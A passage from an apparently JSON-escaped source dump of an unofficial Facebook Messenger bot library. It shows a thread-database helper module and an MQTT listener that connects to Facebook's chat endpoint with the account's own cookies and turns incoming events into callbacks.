(let i of data) {\n                delete data1[String(i)];\n            }\n            fs.writeFileSync(process.cwd() + \"/Horizon_Database/Threads.json\",JSON.stringify(data1));\n        }\n        catch (e) {\n            console.log(e);\n        }\n    }\n}\n\nexports.getAll = function() {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        return Database(true).list();\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            const Data_Res = []\n            var data = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n            for (let i of Object.keys(data)) {\n                Data_Res.push({\n                    ID: String(i),\n                    data: data[String(i)]\n                });\n            }\n            return Data_Res;\n        }\n        catch (e) {\n            console.log(e);\n            return [];\n        }\n    }\n}\n\nexports.hasData = function(threadID) {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        if (Always_True.includes(threadID)) return true;\n        else {\n            const Data_Back = Database(true).has(String(threadID));\n            if (Data_Back === true) Always_True.push(threadID);\n            return Data_Back;\n        }\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            if (Always_True.includes(threadID)) return true;\n            else {\n                var data = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n                var has = data.hasOwnProperty(String(threadID));\n                if (has === true) Always_True.push(threadID);\n                return has\n            }\n        }\n        catch (e) {\n            console.log(e);\n            return false;\n        }\n    }\n}\n\nexports.alreadyUpdate = function(threadID) {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        var Time = Database(true).get(String(threadID)).TimeUpdate;\n            try { \n                if (global.Fca.startTime >= (Time + (3600 * 1000))) {\n                    logger.Normal(getText(language.alreadyUpdate, String(threadID)));\n                    return true;\n                }\n                else return false;\n            }\n            catch (e) { \n                console.log(e);\n            return true;\n        }\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            var data = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n            var Time = data[String(threadID)].TimeUpdate;\n            try { \n                if (global.Fca.startTime >= (Time + (3600 * 1000))) {\n                    logger.Normal(getText(language.alreadyUpdate, String(threadID)));\n                    return true;\n                }\n                else return false;\n            }\n            catch (e) { \n                console.log(e);\n            return true;\n        }\n        }\n        catch (e) {\n            console.log(e);\n            return true;\n        }\n    }\n}\n\nexports.readyCreate = function(Name) {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        switch (Database(true).has(String(Name))) {\n            case true: {\n                if (!Always_True.includes(Name)) Always_True.push(Name);\n\n                if (Number(global.Fca.startTime) >= Number(Database(true).get(String(Name)) + (120 * 1000))) {\n                    return true;\n                }   \n                else {\n                    return false;\n                }\n            }\n            case false: {\n                return false;\n            }\n        }\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            var data = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n            switch (data.hasOwnProperty(String(Name))) {\n                case true: {\n                    if (Number(global.Fca.startTime) >= Number(data[String(Name)] + (120 * 1000))) {\n                        return true;\n                    }   \n                    else {\n                        return false;\n                    }\n                }\n                case false: {\n                    return false;\n                }\n            }\n        }\n        catch (e) {\n            console.log(e);\n            return false;\n        }\n    }\n}\n\nexports.setLastRun = function(Name,LastRun) {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        Database(true).set(String(Name),String(lastRun(LastRun)));\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            var data = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n            data[String(Name)] = String(lastRun(LastRun));\n            fs.writeFileSync(process.cwd() + \"/Horizon_Database/Threads.json\",JSON.stringify(data));\n        }\n        catch (e) {\n            console.log(e);\n        }\n    }\n}\n\nexports.getLastRun = function(Name) {\n    if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"default\") {\n        let Sw;\n        if (Always_True.includes(Name)) Sw = true;\n        else Sw = Database(true).has(String(Name));\n\n        switch (Sw) {\n            case true: {\n                return Database(true).get(String(Name));\n            }\n            case false: {\n                try {\n                    capture(Name)\n                    this.setLastRun(Name,Name);\n                    return Database(true).get(String(Name));\n                }\n                catch(e) {\n                    console.log(e);\n                    return Date.now();\n                }\n            }\n        }\n    }\n    else if (global.Fca.Require.FastConfig.AntiGetInfo.Database_Type == \"json\") {\n        try {\n            let Sw;\n            if (Always_True.includes(Name)) Sw = true;\n            else Sw = data.hasOwnProperty(String(Name));\n            var data = require(process.cwd() + \"/Horizon_Database/Threads.json\");\n            switch (Sw) {\n                case true: {\n                    return data[String(Name)];\n                }\n                case false: {\n                    try {\n                        capture(Name)\n                        this.setLastRun(Name,Name);\n                        return data[String(Name)];\n                    }\n                    catch(e) {\n                        console.log(e);\n                        return Date.now();\n                    }\n                }\n            }\n        }\n        catch (e) {\n            console.log(e);\n            return Date.now();\n        }\n    }\n}","path":null,"size_bytes":12609,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/listenMqttV1.js":{"content":"/* eslint-disable no-redeclare */\n\"use strict\";\nconst utils = require(\"../utils\");\nconst log = require(\"npmlog\");\nconst mqtt = require('mqtt');\nconst Websocket = require('ws');\nconst HttpsProxyAgent = require('https-proxy-agent');\nconst EventEmitter = require('events');\nconst Duplexify = require('duplexify');\nconst Transform = require('readable-stream').Transform;\nvar identity = function () { };\nvar form = {};\nvar getSeqID = function () { };\n\n\nvar topics = [\"/ls_req\",\"/ls_resp\",\"/legacy_web\",\"/webrtc\",\"/rtc_multi\",\"/onevc\",\"/br_sr\",\"/sr_res\",\"/t_ms\",\"/thread_typing\",\"/orca_typing_notifications\",\"/notify_disconnect\",\"/orca_presence\",\"/inbox\",\"/mercury\", \"/messaging_events\", \"/orca_message_notifications\", \"/pp\",\"/webrtc_response\"];\n\n/* [ Noti ? ]\n!   \"/br_sr\", //Notification\n    * => Need to publish /br_sr right after this\n   \n!   \"/notify_disconnect\",\n    * => Need to publish /messenger_sync_create_queue right after this\n\n!   \"/orca_presence\",\n    * => Will receive /sr_res right here.\n  */\n\nvar WebSocket_Global;\n\nfunction buildProxy() {\n    var Proxy = new Transform({\n        objectMode: false\n    });\n\n    Proxy._write = function socketWriteNode(chunk, enc, next) {\n        if (WebSocket_Global.readyState !== WebSocket_Global.OPEN) {\n            return next();\n        }\n    \n        if (typeof chunk === 'string') {\n            chunk = new Buffer.from(chunk, 'utf8');\n        }\n        WebSocket_Global.send(chunk, next);\n    };\n\n    Proxy._flush = function(done) {\n        WebSocket_Global.close();\n        done();\n    };\n\n    Proxy._writev = function(chunks, cb) {\n        var buffers = new Array(chunks.length);\n        for (var i = 0; i < chunks.length; i++) {\n            if (typeof chunks[i].chunk === 'string') {\n                buffers[i] = new Buffer.from(chunks[i], 'utf8');\n            } else {\n                buffers[i] = chunks[i].chunk;\n            }\n        }\n        this._write(new Buffer.concat(buffers), 'binary', cb);\n    };\n\n    return Proxy;\n}\n\nfunction buildStream(options, WebSocket, Proxy) {\n    const Stream = Duplexify(undefined, undefined, options);\n    Stream.socket = WebSocket;\n    \n    WebSocket \n        .onclose = function() {\n            Stream.end();\n            Stream.destroy();\n        };\n    WebSocket\n        .onerror = function(err) {\n            Stream.destroy(err);\n        };\n    WebSocket\n        .onmessage = function(event) {\n            var data = event.data;\n            if (data instanceof ArrayBuffer) data = new Buffer.from(data);\n            else data = new Buffer.from(data, 'utf8');\n            Stream.push(data);\n        };\n    WebSocket\n        .onopen = function() {\n            Stream.setReadable(Proxy);\n            Stream.setWritable(Proxy);\n            Stream.emit('connect');\n        };\n    WebSocket_Global = WebSocket;\n    Proxy.on('close', function() { WebSocket.close(); });\n    return Stream;\n}\n\n\nfunction listenMqtt(defaultFuncs, api, ctx, globalCallback) {\n    //Don't really know what this does but I think it's for the act`ive state?\n    //TODO: Move to ctx when implemented\n    var chatOn = ctx.globalOptions.online;\n    var foreground = false;\n\n    var sessionID = Math.floor((Math.random() * Number.MAX_SAFE_INTEGER)+1);\n    var username = {u: ctx.userID,s: sessionID,chat_on: chatOn,fg: foreground,d: utils.getGUID(),ct: \"websocket\",aid: \"219994525426954\", mqtt_sid: \"\",cp: 3,ecp: 10,st: [],pm: [],dc: \"\",no_auto_fg: true,gas: null,pack: []};\n    var cookies = ctx.jar.getCookies('https://www.facebook.com').join(\"; \");\n\n    var host;\n    if (ctx.mqttEndpoint) host = `${ctx.mqttEndpoint}&sid=${sessionID}`;\n    else if (ctx.region) host = `wss://edge-chat.facebook.com/chat?region=${ctx.region.toLocaleLowerCase()}&sid=${sessionID}`;\n    else host = `wss://edge-chat.facebook.com/chat?sid=${sessionID}`;\n\n    var options = { \n        clientId: \"mqttwsclient\",\n        protocolId: 'MQIsdp',\n        protocolVersion: 3,\n        username: JSON.stringify(username), \n        clean: true,\n        wsOptions: {\n            headers: {\n                'Cookie': cookies,\n                'Origin': 'https://www.facebook.com',\n                'User-Agent': (ctx.globalOptions.userAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36'),\n                'Referer': 'https://www.facebook.com/',\n                'Host': new URL(host).hostname //'edge-chat.facebook.com'\n            },\n            origin: 'https://www.facebook.com',\n            protocolVersion: 13,\n            binaryType: 'arraybuffer',\n        },\n        keepalive: 60,\n        reschedulePings: true,\n        reconnectPeriod: 3\n    };\n\n    if (typeof ctx.globalOptions.proxy != \"undefined\") {\n        var agent = new HttpsProxyAgent(ctx.globalOptions.proxy);\n        options.wsOptions.agent = agent;\n    }\n    ctx.mqttClient = new mqtt.Client(_ => buildStream(options, new Websocket(host, options.wsOptions), buildProxy()), options);\n    global.mqttClient = ctx.mqttClient;\n\n    global.mqttClient.on('error', function (err) {\n        log.error(\"listenMqtt\", err);\n        global.mqttClient.end();\n\n        if (ctx.globalOptions.autoReconnect) getSeqID();\n        else {\n            globalCallback({ type: \"stop_listen\", error: \"Server ƒê√£ S·∫≠p - Auto Restart\" }, null);\n            return process.exit(1);\n        }\n    });\n\n    global.mqttClient.on('connect', function () {\n        if (!global.Fca.Data.Setup || global.Fca.Data.Setup == undefined) {\n            if (global.Fca.Require.FastConfig.RestartMQTT_Minutes != 0 && global.Fca.Data.StopListening != true) { \n                global.Fca.Data.Setup = true;\n                setTimeout(() => {\n                    global.Fca.Require.logger.Warning(\"Closing MQTT Client...\");\n                    ctx.mqttClient.end();\n                    global.Fca.Require.logger.Warning(\"Reconnecting MQTT Client...\");\n                    global.Fca.Data.Setup = false;\n                    getSeqID();\n                }, Number(global.Fca.Require.FastConfig.RestartMQTT_Minutes) * 60 * 1000);\n            }        \n        }\n        if (process.env.OnStatus == undefined) {\n            global.Fca.Require.logger.Normal(\"B·∫°n ƒêang S√†i Phi√™n B·∫£n: Premium Access\");\n            if (Number(global.Fca.Require.FastConfig.AutoRestartMinutes) == 0) {\n                // something\n            }\n            else if (Number(global.Fca.Require.FastConfig.AutoRestartMinutes < 10)) {\n                log.warn(\"AutoRestartMinutes\",\"The number of minutes to automatically restart must be more than 10 minutes\");\n            }\n            else if (Number(global.Fca.Require.FastConfig.AutoRestartMinutes) < 0) {\n                log.warn(\"AutoRestartMinutes\",\"Invalid auto-restart minutes!\");\n            }\n            else {\n                global.Fca.Require.logger.Normal(global.Fca.getText(global.Fca.Require.Language.Src.AutoRestart,global.Fca.Require.FastConfig.AutoRestartMinutes));\n                global.Fca.Require.logger.Normal(\"Auto Restart MQTT Client After: \" + global.Fca.Require.FastConfig.RestartMQTT_Minutes + \" Minutes\");\n                setInterval(() => { \n                    global.Fca.Require.logger.Normal(global.Fca.Require.Language.Src.OnRestart);\n                    process.exit(1);\n                }, Number(global.Fca.Require.FastConfig.AutoRestartMinutes) * 60000);\n            }\n            require('../broadcast').startBroadcasting();\n            const MemoryManager = require('../Extra/Src/Release_Memory');\n            const path = require('path');\n\n            const memoryManager = new MemoryManager({\n                warningThreshold: 0.6,\n                releaseThreshold: 0.7, \n                maxThreshold: 0.8, \n                interval: 30 * 1000,\n                logLevel: 'warn',\n                logFile: path.join(__dirname, 'memory.log'),\n                smartReleaseEnabled: true,\n            });\n\n\n            memoryManager.autoStart(60 * 60 * 1000); \n\n            process.env.OnStatus = true;\n        }\n        \n        topics.forEach(topicsub => global.mqttClient.subscribe(topicsub));\n\n        var topic;\n        var queue = {\n            sync_api_version: 11,\n            max_deltas_able_to_process: 100,\n            delta_batch_size: 500,\n            encoding: \"JSON\",\n            entity_fbid: ctx.userID,\n        };\n\n        topic = \"/messenger_sync_create_queue\";\n        queue.initial_titan_sequence_id = ctx.lastSeqId;\n        queue.device_params = null;\n\n        global.mqttClient.publish(topic, JSON.stringify(queue), { qos: 1, retain: false });\n\n        var rTimeout = setTimeout(function () {\n            global.mqttClient.end();\n            getSeqID();\n        }, 3000);\n\n        ctx.tmsWait = function () {\n            clearTimeout(rTimeout);\n            ctx.globalOptions.emitReady ? globalCallback({type: \"ready\",error: null}) : '';\n            delete ctx.tmsWait;\n        };\n    });\n\n    global.mqttClient.on('message', function (topic, message, _packet) {\n        const jsonMessage = JSON.parse(message.toString());\n        console.log(message.toString())\n        if (topic === \"/t_ms\") {\n            if (ctx.tmsWait && typeof ctx.tmsWait == \"function\") ctx.tmsWait();\n\n            if (jsonMessage.firstDeltaSeqId && jsonMessage.syncToken) {\n                ctx.lastSeqId = jsonMessage.firstDeltaSeqId;\n                ctx.syncToken = jsonMessage.syncToken;\n            }\n\n            if (jsonMessage.lastIssuedSeqId) ctx.lastSeqId = parseInt(jsonMessage.lastIssuedSeqId);\n            //If it contains more than 1 delta\n            for (var i in jsonMessage.deltas) {\n                var delta = jsonMessage.deltas[i];\n                parseDelta(defaultFuncs, api, ctx, globalCallback, { \"delta\": delta });\n            }\n        } \n        else if (topic === \"/ls_resp\") {\n            console.log((jsonMessage.payload));\n            const payload = JSON.parse(jsonMessage.payload); //'{\"name\":null,\"step\":[1,[1,[4,0,1,[5,\"taskExists\",[19,\"415\"]]],[23,[2,0],[1,[5,\"replaceOptimsiticMessage\",\"7192532113093667880\",\"mid.$gABfX5li9LA6VdUymnWPRAdlkiawo\"]]]],[1,[4,0,1,[5,\"taskExists\",[19,\"415\"]]],[23,[2,0],[1,[5,\"mailboxTaskCompletionApiOnTaskCompletion\",[19,\"415\"],true]]]],[1,[4,0,1,[5,\"taskExists\",[19,\"415\"]]],[23,[2,0],[1,[5,\"removeTask\",[19,\"415\"],[9]]]]]]}'\n            const request_ID = jsonMessage.request_id;\n            if (ctx.callback_Task[request_ID] != undefined) {\n                const { callback, type } = ctx.callback_Task[request_ID];\n                const Data = new getRespData(type, payload);\n\n                if (!Data) {\n                    callback(\"Something went wrong üê≥\", null);\n                }\n                else {\n                    callback(null, Data);\n                }\n            }\n        }\n        else if (topic === \"/thread_typing\" || topic === \"/orca_typing_notifications\") {\n            var typ = {\n                type: \"typ\",\n                isTyping: !!jsonMessage.state,\n                from: jsonMessage.sender_fbid.toString(),\n                threadID: utils.formatID((jsonMessage.thread || jsonMessage.sender_fbid).toString())\n            };\n            (function () { globalCallback(null, typ); })();\n        } else if (topic === \"/orca_presence\") {\n            if (!ctx.globalOptions.updatePresence) {\n                for (var i in jsonMessage.list) {\n                    var data = jsonMessage.list[i];\n                    var userID = data[\"u\"];\n\n                    var presence = {\n                        type: \"presence\",\n                        userID: userID.toString(),\n                        //Convert to ms\n                        timestamp: data[\"l\"] * 1000,\n                        statuses: data[\"p\"]\n                    };\n                    (function () { globalCallback(null, presence); })();\n                }\n            }\n        }\n\n    });\n\n    process.on('SIGINT', function () {\n        LogUptime();\n        process.kill(process.pid);\n    });\n\n    process.on('exit', () => {\n        LogUptime();\n    });\n    \n}\n\nfunction getRespData(Type, payload) {\n    try { \n        switch (Type) {\n            case \"sendMqttMessage\": {\n                return {\n                    type: Type,\n                    threadID: payload.step[1][2][2][1][2], //this is sick bro\n                    messageID: payload.step[1][2][2][1][3],\n                    payload: payload.step[1][2]\n                };\n            }\n            default: { //!very LAZY :> cook yourself\n                return {\n                    Data: payload.step[1][2][2][1],\n                    type: Type,\n                    payload: payload.step[1][2] \n                };\n            }\n        }\n    }\n    catch (e) {\n        return null;\n    }\n}\n\nfunction LogUptime() {\n    var uptime = process.uptime();\n    var { join } = require('path');\n    if (global.Fca.Require.fs.existsSync(join(__dirname, '../CountTime.json'))) {\n        var Time1 = (Number(global.Fca.Require.fs.readFileSync(join(__dirname, '../CountTime.json'), 'utf8')) || 0);\n        global.Fca.Require.fs.writeFileSync(join(__dirname, '../CountTime.json'), String(Number(uptime) + Time1), 'utf8');\n    }\n    else {\n        var Time1 = 0;\n        global.Fca.Require.fs.writeFileSync(join(__dirname, '../CountTime.json'), String(Number(uptime) + Time1), 'utf8');\n    }\n}\nfunction parseDelta(defaultFuncs, api, ctx, globalCallback, v) {\n    if (v.delta.class == \"NewMessage\") {\n        //Not tested for pages\n        if (ctx.globalOptions.pageID && ctx.globalOptions.pageID != v.queue) return;\n\n        (function resolveAttachmentUrl(i) {\n            if (v.delta.attachments && (i == v.delta.attachments.length) || utils.getType(v.delta.attachments) !== \"Array\") {\n                var fmtMsg;\n                try {\n                    fmtMsg = utils.formatDeltaMessage(v);\n                } catch (err) {\n                    return log.error(\"L·ªói Nh·∫π\", err);\n                }\n                global.Fca.Data.event = fmtMsg;\n                try {\n                    var { updateMessageCount,getData,hasData } = require('../Extra/ExtraGetThread');\n                    if (hasData(fmtMsg.threadID)) {\n                        var x = getData(fmtMsg.threadID);\n                        x.messageCount+=1;\n                        updateMessageCount(fmtMsg.threadID,x);\n                    }   \n                }\n                catch (e) {\n                    //temp\n                }\n                if (fmtMsg)\n                    if (ctx.globalOptions.autoMarkDelivery) markDelivery(ctx, api, fmtMsg.threadID, fmtMsg.messageID);\n\n                return !ctx.globalOptions.selfListen && fmtMsg.senderID === ctx.userID ? undefined : (function () { globalCallback(null, fmtMsg); })();\n            } else {\n                if (v.delta.attachments && (v.delta.attachments[i].mercury.attach_type == \"photo\")) {\n                    api.resolvePhotoUrl(v.delta.attachments[i].fbid, (err, url) => {\n                        if (!err) v.delta.attachments[i].mercury.metadata.url = url;\n                        return resolveAttachmentUrl(i + 1);\n                    });\n                } else return resolveAttachmentUrl(i + 1);\n            }\n        })(0);\n    }\n\n    if (v.delta.class == \"ClientPayload\") {\n        var clientPayload = utils.decodeClientPayload(v.delta.payload);\n        if (clientPayload && clientPayload.deltas) {\n            for (var i in clientPayload.deltas) {\n                var delta = clientPayload.deltas[i];\n                if (delta.deltaMessageReaction && !!ctx.globalOptions.listenEvents) {\n                    (function () {\n                        globalCallback(null, {\n                            type: \"message_reaction\",\n                            threadID: (delta.deltaMessageReaction.threadKey.threadFbId ? delta.deltaMessageReaction.threadKey.threadFbId : delta.deltaMessageReaction.threadKey.otherUserFbId).toString(),\n                            messageID: delta.deltaMessageReaction.messageId,\n                            reaction: delta.deltaMessageReaction.reaction,\n                            senderID: delta.deltaMessageReaction.senderId.toString(),\n                            userID: delta.deltaMessageReaction.userId.toString()\n                        });\n                    })();\n                } else if (delta.deltaRecallMessageData && !!ctx.globalOptions.listenEvents) {\n                    (function () {\n                        globalCallback(null, {\n                            type: \"message_unsend\",\n                            threadID: (delta.deltaRecallMessageData.threadKey.threadFbId ? delta.deltaRecallMessageData.threadKey.threadFbId : delta.deltaRecallMessageData.threadKey.otherUserFbId).toString(),\n                            messageID: delta.deltaRecallMessageData.messageID,\n                            senderID: delta.deltaRecallMessageData.senderID.toString(),\n                            deletionTimestamp: delta.deltaRecallMessageData.deletionTimestamp,\n                            timestamp: delta.deltaRecallMessageData.timestamp\n                        });\n                    })();\n                } else if (delta.deltaMessageReply) {\n                    //Mention block - #1\n                    var mdata =\n                        delta.deltaMessageReply.message === undefined ? [] :\n                            delta.deltaMessageReply.message.data === undefined ? [] :\n                                delta.deltaMessageReply.message.data.prng === undefined ? [] :\n                                    JSON.parse(delta.deltaMessageReply.message.data.prng);\n                    var m_id = mdata.map(u => u.i);\n                    var m_offset = mdata.map(u => u.o);\n                    var m_length = mdata.map(u => u.l);\n\n                    var mentions = {};\n\n                    for (var i = 0; i < m_id.length; i++) mentions[m_id[i]] = (delta.deltaMessageReply.message.body || \"\").substring(m_offset[i], m_offset[i] + m_length[i]);\n                    //Mention block - 1#\n                    var callbackToReturn = {\n                        type: \"message_reply\",\n                        threadID: (delta.deltaMessageReply.message.messageMetadata.threadKey.threadFbId ? delta.deltaMessageReply.message.messageMetadata.threadKey.threadFbId : delta.deltaMessageReply.message.messageMetadata.threadKey.otherUserFbId).toString(),\n                        messageID: delta.deltaMessageReply.message.messageMetadata.messageId,\n                        senderID: delta.deltaMessageReply.message.messageMetadata.actorFbId.toString(),\n                        attachments: delta.deltaMessageReply.message.attachments.map(function (att) {\n                            var mercury = JSON.parse(att.mercuryJSON);\n                            Object.assign(att, mercury);\n                            return att;\n                        }).map(att => {\n                            var x;\n                            try {\n                                x = utils._formatAttachment(att);\n                            } catch (ex) {\n                                x = att;\n                                x.error = ex;\n                                x.type = \"unknown\";\n                            }\n                            return x;\n                        }),\n                        args: (delta.deltaMessageReply.message.body || \"\").trim().split(/\\s+/),\n                        body: (delta.deltaMessageReply.message.body || \"\"),\n                        isGroup: !!delta.deltaMessageReply.message.messageMetadata.threadKey.threadFbId,\n                        mentions: mentions,\n                        timestamp: delta.deltaMessageReply.message.messageMetadata.timestamp,\n                        participantIDs: (delta.deltaMessageReply.message.participants || []).map(e => e.toString())\n                    };\n\n                    if (delta.deltaMessageReply.repliedToMessage) {\n                        //Mention block - #2\n                        mdata =\n                            delta.deltaMessageReply.repliedToMessage === undefined ? [] :\n                                delta.deltaMessageReply.repliedToMessage.data === undefined ? [] :\n                                    delta.deltaMessageReply.repliedToMessage.data.prng === undefined ? [] :\n                                        JSON.parse(delta.deltaMessageReply.repliedToMessage.data.prng);\n                        m_id = mdata.map(u => u.i);\n                        m_offset = mdata.map(u => u.o);\n                        m_length = mdata.map(u => u.l);\n\n                        var rmentions = {};\n\n                        for (var i = 0; i < m_id.length; i++) rmentions[m_id[i]] = (delta.deltaMessageReply.repliedToMessage.body || \"\").substring(m_offset[i], m_offset[i] + m_length[i]);\n                        //Mention block - 2#\n                        callbackToReturn.messageReply = {\n                            threadID: (delta.deltaMessageReply.repliedToMessage.messageMetadata.threadKey.threadFbId ? delta.deltaMessageReply.repliedToMessage.messageMetadata.threadKey.threadFbId : delta.deltaMessageReply.repliedToMessage.messageMetadata.threadKey.otherUserFbId).toString(),\n                            messageID: delta.deltaMessageReply.repliedToMessage.messageMetadata.messageId,\n                            senderID: delta.deltaMessageReply.repliedToMessage.messageMetadata.actorFbId.toString(),\n                            attachments: delta.deltaMessageReply.repliedToMessage.attachments.map(function (att) {\n                                var mercury = JSON.parse(att.mercuryJSON);\n                                Object.assign(att, mercury);\n                                return att;\n                            }).map(att => {\n                                var x;\n                                try {\n                                    x = utils._formatAttachment(att);\n                                } catch (ex) {\n                                    x = att;\n                                    x.error = ex;\n                                    x.type = \"unknown\";\n                                }\n                                return x;\n                            }),\n                            args: (delta.deltaMessageReply.repliedToMessage.body || \"\").trim().split(/\\s+/),\n                            body: delta.deltaMessageReply.repliedToMessage.body || \"\",\n                            isGroup: !!delta.deltaMessageReply.repliedToMessage.messageMetadata.threadKey.threadFbId,\n                            mentions: rmentions,\n                            timestamp: delta.deltaMessageReply.repliedToMessage.messageMetadata.timestamp,\n                            participantIDs: (delta.deltaMessageReply.repliedToMessage.participants || []).map(e => e.toString())\n                        };\n                    } else if (delta.deltaMessageReply.replyToMessageId) {\n                        return defaultFuncs\n                            .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, {\n                                \"av\": ctx.globalOptions.pageID,\n                                \"queries\": JSON.stringify({\n                                    \"o0\": {\n                                        //Using the same doc_id as forcedFetch\n                                        \"doc_id\": \"2848441488556444\",\n                                        \"query_params\": {\n                                            \"thread_and_message_id\": {\n                                                \"thread_id\": callbackToReturn.threadID,\n                                                \"message_id\": delta.deltaMessageReply.replyToMessageId.id,\n                                            }\n                                        }\n                                    }\n                                })\n                            })\n                            .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n                            .then((resData) => {\n                                if (resData[resData.length - 1].error_results > 0) throw resData[0].o0.errors;\n                                if (resData[resData.length - 1].successful_results === 0) throw { error: \"forcedFetch: there was no successful_results\", res: resData };\n                                var fetchData = resData[0].o0.data.message;\n                                var mobj = {};\n                                for (var n in fetchData.message.ranges) mobj[fetchData.message.ranges[n].entity.id] = (fetchData.message.text || \"\").substr(fetchData.message.ranges[n].offset, fetchData.message.ranges[n].length);\n\n                                callbackToReturn.messageReply = {\n                                    type: \"Message\",\n                                    threadID: callbackToReturn.threadID,\n                                    messageID: fetchData.message_id,\n                                    senderID: fetchData.message_sender.id.toString(),\n                                    attachments: fetchData.message.blob_attachment.map(att => {\n                                        var x;\n                                        try {\n                                            x = utils._formatAttachment({ blob_attachment: att });\n                                        } catch (ex) {\n                                            x = att;\n                                            x.error = ex;\n                                            x.type = \"unknown\";\n                                        }\n                                        return x;\n                                    }),\n                                    args: (fetchData.message.text || \"\").trim().split(/\\s+/) || [],\n                                    body: fetchData.message.text || \"\",\n                                    isGroup: callbackToReturn.isGroup,\n                                    mentions: mobj,\n                                    timestamp: parseInt(fetchData.timestamp_precise)\n                                };\n                            })\n                            .catch(err => log.error(\"forcedFetch\", err))\n                            .finally(function () {\n                                if (ctx.globalOptions.autoMarkDelivery) markDelivery(ctx, api, callbackToReturn.threadID, callbackToReturn.messageID);\n                                !ctx.globalOptions.selfListen && callbackToReturn.senderID === ctx.userID ? undefined : (function () { globalCallback(null, callbackToReturn); })();\n                            });\n                    } else callbackToReturn.delta = delta;\n            \n                    if (ctx.globalOptions.autoMarkDelivery) markDelivery(ctx, api, callbackToReturn.threadID, callbackToReturn.messageID);\n\n                    return !ctx.globalOptions.selfListen && callbackToReturn.senderID === ctx.userID ? undefined : (function () { globalCallback(null, callbackToReturn); })();\n                }\n            }\n            return;\n        }\n    }\n    switch (v.delta.class) {\n        case \"ReadReceipt\": {\n            var fmtMsg;\n            try {\n                fmtMsg = utils.formatDeltaReadReceipt(v.delta);\n            } catch (err) {\n                return log.error(\"L·ªói Nh·∫π\", err);\n            }\n            return (function () { globalCallback(null, fmtMsg); })();\n        }\n        case \"AdminTextMessage\": {\n            switch (v.delta.type) {\n                case \"joinable_group_link_mode_change\":\n                case \"magic_words\":\n                case \"pin_messages_v2\":\n                case \"change_thread_theme\":\n                case \"change_thread_icon\":\n                case \"change_thread_nickname\":\n                case \"change_thread_admins\":\n                case \"change_thread_approval_mode\":\n                case \"group_poll\":\n                case \"messenger_call_log\":\n                case \"participant_joined_group_call\":\n                    var fmtMsg;\n                    try {\n                        fmtMsg = utils.formatDeltaEvent(v.delta);\n                    } catch (err) {\n                        console.log(v.delta);\n                        return log.error(\"L·ªói Nh·∫π\", err);\n                    }\n                    return (function () { globalCallback(null, fmtMsg); })();\n                }\n            break;\n        }\n        //For group images\n        case \"ForcedFetch\": {\n            if (!v.delta.threadKey) return;\n            var mid = v.delta.messageId;\n            var tid = v.delta.threadKey.threadFbId;\n            if (mid && tid) {\n                const form = {\n                    \"av\": ctx.globalOptions.pageID,\n                    \"queries\": JSON.stringify({\n                        \"o0\": {\n                            //This doc_id is valid as of March 25, 2020\n                            \"doc_id\": \"2848441488556444\",\n                            \"query_params\": {\n                                \"thread_and_message_id\": {\n                                    \"thread_id\": tid.toString(),\n                                    \"message_id\": mid,\n                                }\n                            }\n                        }\n                    })\n                };\n\n                defaultFuncs\n                    .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n                    .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n                    .then((resData) => {\n                        if (resData[resData.length - 1].error_results > 0) throw resData[0].o0.errors;\n\n                        if (resData[resData.length - 1].successful_results === 0) throw { error: \"forcedFetch: there was no successful_results\", res: resData };\n\n                        var fetchData = resData[0].o0.data.message;\n\n                        if (utils.getType(fetchData) == \"Object\") {\n                            log.info(\"forcedFetch\", fetchData);\n                            switch (fetchData.__typename) {\n                                case \"ThreadImageMessage\":\n                                    (!ctx.globalOptions.selfListen &&\n                                        fetchData.message_sender.id.toString() === ctx.userID) ||\n                                        !ctx.loggedIn ?\n                                        undefined :\n                                        (function () {\n                                            globalCallback(null, {\n                                                type: \"change_thread_image\",\n                                                threadID: utils.formatID(tid.toString()),\n                                                snippet: fetchData.snippet,\n                                                timestamp: fetchData.timestamp_precise,\n                                                author: fetchData.message_sender.id,\n                                                image: {\n                                                    attachmentID: fetchData.image_with_metadata && fetchData.image_with_metadata.legacy_attachment_id,\n                                                    width: fetchData.image_with_metadata && fetchData.image_with_metadata.original_dimensions.x,\n                                                    height: fetchData.image_with_metadata && fetchData.image_with_metadata.original_dimensions.y,\n                                                    url: fetchData.image_with_metadata && fetchData.image_with_metadata.preview.uri\n                                                }\n                                            });\n                                        })();\n                                    break;\n                                case \"UserMessage\":\n                                    log.info(\"ff-Return\", {\n                                        type: \"message\",\n                                        senderID: utils.formatID(fetchData.message_sender.id),\n                                        body: fetchData.message.text || \"\",\n                                        threadID: utils.formatID(tid.toString()),\n                                        messageID: fetchData.message_id,\n                                        attachments: [{\n                                            type: \"share\",\n                                            ID: fetchData.extensible_attachment.legacy_attachment_id,\n                                            url: fetchData.extensible_attachment.story_attachment.url,\n\n                                            title: fetchData.extensible_attachment.story_attachment.title_with_entities.text,\n                                            description: fetchData.extensible_attachment.story_attachment.description.text,\n                                            source: fetchData.extensible_attachment.story_attachment.source,\n\n                                            image: 